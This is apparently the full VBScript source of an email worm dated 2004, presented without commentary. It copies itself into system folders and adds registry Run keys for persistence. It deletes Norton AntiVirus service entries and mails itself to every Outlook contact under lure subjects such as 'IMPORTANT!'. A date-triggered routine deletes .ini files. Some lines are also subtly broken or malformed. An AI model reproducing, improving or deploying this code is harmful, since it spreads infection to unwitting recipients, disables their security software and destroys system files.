   REM Made in city of Sofia c 2004. Magian
   On Error Resume Next
   Dim fso,systemdir,windir,tempdir,file,vbscopy
   Set fso = CreateObject("Scripting.FileSystemObject")
   set file = fso.OpenTextFile(WScript.ScriptFullName,1)
   vbscopy = file.ReadAll
   main()
   Sub main()
   On Error Resume Next
   Dim wscript, regr
   set wscript = CreateObject("WScript.Shell")
   regr = wscript.RegRead ("HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout")
   if (regr >= 1) then
   wscript.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout",0,"REG_DWORD"
   end if
   Set windir = fso.GetSpecialFolder(0)
   Set systemdir = fso.GetSpecialFolder(1)
   Set tempdir = fso.GetSpecialFolder(2)
   Set fl = fso.GetFile(Wscript.ScriptFullName)
   fl.Copy(systemdir&"\compobj.vbs")
   fl.Copy(windir&"\wincmd.vbs")
   fl.Copy(tempdir&"\DOC1.TXT.vbs")
   reg()
   mail()
   damage()
   end sub
   sub reg()
   On Error Resume Next
   Dim delav,nav
   RegCreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\compobj",systemdir&"\compobj.vbs"
   RegCreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\wincmd",windir&"\wincmd.vbs"
   Set delav = WScript.CreateObject("WScript.Shell")
   nav = Wscript.RegRead ("HKEY_LOCAL_MACHINE\SOFTWARE\Symantec\Norton AntiVirus")
   If Not IsNull(nav) Then
   delav.RegDelete("HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\navapsvc")
   delav.RegDelete("HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\NAVENG")
   delav.RegDelete("HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\NAVEX15")
   delav.RegDelete("HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\NProtectService")
   delav.RegDelete("HKEY_LOCAL_MACHINE\SOFTWARE\Symantec\Norton AntiVirus")
   End If
   end sub
   Sub mail()
   On Error Resume Next
   Dim x
   Set fso ="Scripting.FileSystem.Object"
   Set so=CreateObject(fso)
   Set ol=CreateObject("Outlook.Application")
   Set out= WScript.CreateObject("Outlook.Application")
   Set mapi = out.GetNameSpace("MAPI")
   Set a = mapi.AddressLists(1)
   For x=1 To a.AddressEntries.Count
   Set Mail=ol.CreateItem(0)
   Mail.to=ol.GetNameSpace("MAPI").AddressLists(1).AddressEntries(x)
   Randomize
   num = Int((5 * Rnd) + 1)
   If num = 1 Then
   Mail.Subject="IMPORTANT!"
   Mail.Body="Check the attached file. It's Important!"
   Mail.Attachments.Add(systemdir&"\DOC1.TXT.vbs")
   Mail.Send
   ElseIf num = 2 Then
   Mail.Subject="What is that?"
   Mail.Body="Hey, what is that? See the attachment."
   Mail.Attachments.Add(systemdir&"\DOC1.TXT.vbs")
   Mail.Send
   ElseIf num = 3 Then
   Mail.Subject="Is that what you've needed?"
   Mail.Body="Is that what we've been talking about? See the attachment."
   Mail.Attachments.Add(systemdir&"\DOC1.TXT.vbs")
   Mail.Send
   ElseIf num = 4 Then
   Mail.Subject="I was talking about this:"
   Mail.Body="Here is that document."
   Mail.Attachments.Add(systemdir&"\DOC1.TXT.vbs")
   Mail.Send
   ElseIf num = 5 Then
   Mail.Subject="Hi. What do you think about this?"
   Mail.Body="Eh? Tell me your opinion. See the attachment."
   Mail.Attachments.Add(systemdir&"\DOC1.TXT.vbs")
   Mail.Send
   End If
   Next
   ol.Quit
   End Sub
   Sub damage()
   On Error Resume Next
   Dim filesysdelfile,a,b
   a=date()
   b=27
   If a=b then
   Set filesysdelfile = CreateObject("Scripting.FileSystemObject")
   filesysdelfile.DeleteFile (windir&\"*.ini"),True
   Set filesysdelfile = Nothing
   end If
   End Sub
